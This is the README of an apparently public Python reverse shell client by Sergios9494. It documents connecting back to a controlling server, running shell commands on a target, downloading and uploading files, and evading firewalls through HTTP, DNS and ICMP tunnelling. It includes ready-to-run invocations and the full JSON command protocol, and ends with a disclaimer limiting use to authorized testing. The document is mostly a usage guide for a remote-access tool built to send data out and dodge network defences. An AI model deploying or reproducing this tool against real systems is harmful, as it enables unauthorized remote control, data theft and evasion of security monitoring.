# Advanced Reverse Shell Client with Firewall Bypass

A feature-rich Python reverse shell client with encryption, file transfer, automatic reconnection, and **firewall bypass capabilities**.

## Features

- ✅ **Firewall Bypass**: HTTP tunneling, DNS tunneling, ICMP tunneling
- ✅ **Port 80/443 Fallback**: Automatically tries common ports if connection fails
- ✅ **Automatic Reconnection**: Automatically reconnects if connection is lost
- ✅ **SSL/TLS Support**: Optional encrypted communication
- ✅ **File Transfer**: Download and upload files with integrity checking
- ✅ **Proper Framing**: Uses length-prefixed messages for reliable communication
- ✅ **System Information**: Sends system info on connection
- ✅ **Error Handling**: Comprehensive error handling and logging
- ✅ **Command Execution**: Safe command execution with proper working directory
- ✅ **Logging**: Detailed logging to file and console
- ✅ **Configurable**: Multiple command-line options

## Installation

### Requirements

**Core dependencies** (standard library only):
- Python 3.6+

**Optional dependencies** (for advanced firewall bypass):
```bash
# For DNS tunneling
pip install dnspython

# For ICMP tunneling
pip install scapy
```

**Note**: Core functionality works without optional dependencies. Advanced tunneling features require the above packages.

## Usage

### Basic Usage

```bash
python3 client.py --host 192.168.1.100 --port 4444
```

### With SSL/TLS

```bash
python3 client.py --host example.com --port 8080 --ssl
```

### Custom Reconnection Delay

```bash
python3 client.py --host 10.0.0.1 --port 9999 --reconnect-delay 10
```

### Firewall Bypass - HTTP Tunneling

```bash
# Tunnel through HTTP (port 80)
python3 client.py --host example.com --tunnel http --port 80

# Tunnel through HTTPS (port 443)
python3 client.py --host example.com --tunnel http --port 443 --ssl
```

### Firewall Bypass - DNS Tunneling

```bash
# Tunnel through DNS queries
python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
```

### Firewall Bypass - ICMP Tunneling

```bash
# Tunnel through ICMP ping packets
python3 client.py --host 192.168.1.100 --tunnel icmp
```

### Firewall Bypass - Auto Mode

```bash
# Automatically try all bypass methods
python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
```

## Command-Line Options

| Option | Short | Description | Default |
|--------|-------|-------------|---------|
| `--host` | `-H` | Server hostname or IP address | `192.168.1.102` |
| `--port` | `-p` | Server port number | `4444` |
| `--ssl` | | Enable SSL/TLS encryption | `False` |
| `--tunnel` | `-t` | Tunneling mode: `direct`, `http`, `dns`, `icmp`, or `auto` | `direct` |
| `--http-path` | | HTTP path for HTTP tunneling | `/api/data` |
| `--dns-domain` | | DNS domain for DNS tunneling | `None` |
| `--port-fallback` | | Automatically try port 80/443 if connection fails | `False` |
| `--reconnect-delay` | `-d` | Delay between reconnection attempts (seconds) | `5` |
| `--buffer-size` | `-b` | Socket buffer size | `4096` |

## Protocol

### Message Format

All messages use a length-prefixed format:
- 4 bytes: Message length (big-endian)
- N bytes: JSON-encoded message data

### Command Types

#### 1. Command Execution

```json
{
  "type": "command",
  "data": "ls -la"
}
```

Response:
```json
{
  "type": "result",
  "data": "total 48\ndrwxr-xr-x..."
}
```

#### 2. File Download

```json
{
  "type": "download",
  "data": "/path/to/file.txt"
}
```

Response:
```json
{
  "type": "download_result",
  "data": {
    "status": "success",
    "filename": "file.txt",
    "data": "base64_encoded_data...",
    "size": 1024,
    "hash": "md5_hash"
  }
}
```

#### 3. File Upload

```json
{
  "type": "upload",
  "path": "/path/to/destination.txt",
  "file_data": {
    "filename": "source.txt",
    "data": "base64_encoded_data..."
  }
}
```

Response:
```json
{
  "type": "upload_result",
  "data": "File uploaded successfully: /path/to/destination.txt (1024 bytes)"
}
```

#### 4. System Information

```json
{
  "type": "system_info",
  "data": ""
}
```

Response:
```json
{
  "type": "system_info",
  "data": "{\n  \"hostname\": \"client-pc\",\n  \"platform\": \"Linux\",\n  ...\n}"
}
```

#### 5. Exit

```json
{
  "type": "exit",
  "data": ""
}
```

## Legacy String Commands

For backward compatibility, the client also supports legacy string-based commands:

- `exit` - Exit the client
- `cd /path/to/dir` - Change directory
- `download /path/to/file` - Download file
- `upload /path/to/file` - Upload file (followed by file data)
- Any other command - Execute as shell command

## Firewall Bypass Techniques

### HTTP Tunneling
Tunnels traffic through HTTP/HTTPS requests, making it appear as normal web traffic. Effective against firewalls that allow web browsing.

**How it works:**
- Wraps shell data in HTTP POST requests
- Server responds with commands in HTTP responses
- Looks like normal web API traffic

### DNS Tunneling
Tunnels data through DNS queries. Useful when only DNS (port 53) is allowed.

**How it works:**
- Encodes data in DNS query subdomains
- Server responds with commands in DNS responses
- Requires DNS domain control

### ICMP Tunneling
Tunnels data through ICMP ping packets. Useful when ping is allowed but other ports are blocked.

**How it works:**
- Encodes data in ICMP packet payloads
- Server extracts commands from ICMP packets
- Requires root/admin privileges

### Port 80/443 Fallback
Automatically tries common web ports (80/443) if the primary port is blocked.

## Examples

### Example 1: Basic Connection

```bash
python3 client.py --host 192.168.1.100 --port 4444
```

### Example 2: Encrypted Connection

```bash
python3 client.py --host secure.example.com --port 8443 --ssl
```

### Example 3: HTTP Tunneling (Firewall Bypass)

```bash
python3 client.py --host example.com --tunnel http --port 80
```

### Example 4: DNS Tunneling (Firewall Bypass)

```bash
python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
```

### Example 5: Auto Mode with Fallback

```bash
python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
```

### Example 6: Custom Configuration

```bash
python3 client.py \
  --host 10.0.0.50 \
  --port 9999 \
  --reconnect-delay 10 \
  --buffer-size 8192
```

## File Transfer

### Downloading Files

The client can download files from the target system:

1. Server sends: `{"type": "download", "data": "/path/to/file"}`
2. Client responds with base64-encoded file data and metadata

### Uploading Files

The client can upload files to the target system:

1. Server sends: `{"type": "upload", "path": "/destination/path", "file_data": {...}}`
2. Client saves the file and responds with confirmation

## Error Handling

The client includes comprehensive error handling:

- **Connection Errors**: Automatic reconnection with configurable delay
- **File Errors**: Permission errors, file not found, etc.
- **Command Errors**: Safe command execution with error capture
- **Network Errors**: Timeout handling, connection reset, etc.

All errors are logged to `client.log` and sent to the server.

## Logging

The client logs all activities to:

- **Console**: Real-time output
- **File**: `client.log` (in the same directory as the script)

Log levels:
- **INFO**: Normal operations
- **WARNING**: Non-critical issues (reconnection attempts)
- **ERROR**: Critical errors

## Security Considerations

⚠️ **IMPORTANT**: This tool is for authorized penetration testing and security research only.

- Only use on systems you own or have explicit written permission to test
- Unauthorized use may be illegal in your jurisdiction
- Always comply with local laws and regulations
- Use SSL/TLS in production environments
- Consider implementing authentication mechanisms

## Improvements Over Original

The improved version includes:

1. **Better Connection Management**
   - Automatic reconnection
   - Connection timeout handling
   - Proper connection cleanup

2. **Enhanced Protocol**
   - Length-prefixed messages
   - Structured JSON commands
   - Better error reporting

3. **File Transfer Improvements**
   - File integrity checking (MD5 hash)
   - File size reporting
   - Better error messages

4. **System Information**
   - Automatic system info on connection
   - Detailed platform information

5. **Error Handling**
   - Comprehensive exception handling
   - Detailed logging
   - Graceful error recovery

6. **Code Quality**
   - Object-oriented design
   - Better code organization
   - Type hints and documentation
   - Command-line interface

## Requirements

- Python 3.6+
- No external dependencies (uses only standard library)

## License

This project is provided as-is for educational and authorized testing purposes.

## Author

Sergios9494

## Contributing

Contributions, issues, and feature requests are welcome!

